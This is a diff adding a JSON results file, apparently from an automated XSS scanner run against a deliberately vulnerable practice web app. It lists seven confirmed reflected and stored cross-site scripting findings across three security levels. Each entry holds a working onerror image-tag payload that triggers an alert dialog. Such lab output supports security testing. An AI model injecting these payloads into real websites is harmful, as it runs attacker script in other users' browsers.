@@ -1,0 +1,86 @@
+[
+  {
+    "level": "high",
+    "surface": "reflected",
+    "type": "reflected",
+    "param": "name",
+    "payload": "<img/src=\"x\"/onerror=alert('xssv_dd234eda')//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "xssv_dd234eda"
+    ]
+  },
+  {
+    "level": "high",
+    "surface": "stored_txtName",
+    "type": "stored",
+    "param": "txtName",
+    "payload": "<img/src=\"x\"/onerror=alert(2227714830)//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "2227714830"
+    ]
+  },
+  {
+    "level": "low",
+    "surface": "reflected",
+    "type": "reflected",
+    "param": "name",
+    "payload": "<img/src=\"x\"/onerror=alert('xssv_e3ecac42')//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "xssv_e3ecac42"
+    ]
+  },
+  {
+    "level": "low",
+    "surface": "stored_mtxMessage",
+    "type": "stored",
+    "param": "mtxMessage",
+    "payload": "<img/src=\"x\"/onerror=alert(2928012899)//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "2928012899"
+    ]
+  },
+  {
+    "level": "low",
+    "surface": "stored_txtName",
+    "type": "stored",
+    "param": "txtName",
+    "payload": "<img/src=\"x\"/onerror=alert(8146476675)//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "8146476675"
+    ]
+  },
+  {
+    "level": "medium",
+    "surface": "reflected",
+    "type": "reflected",
+    "param": "name",
+    "payload": "<img/src=\"x\"/onerror=alert('xssv_22dabcc1')//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "xssv_22dabcc1"
+    ]
+  },
+  {
+    "level": "medium",
+    "surface": "stored_txtName",
+    "type": "stored",
+    "param": "txtName",
+    "payload": "<img/src=\"x\"/onerror=alert(2322871109)//>",
+    "scanner_severity": "high",
+    "dialog_confirmed": true,
+    "dialogs": [
+      "2322871109"
+    ]
+  }
+]
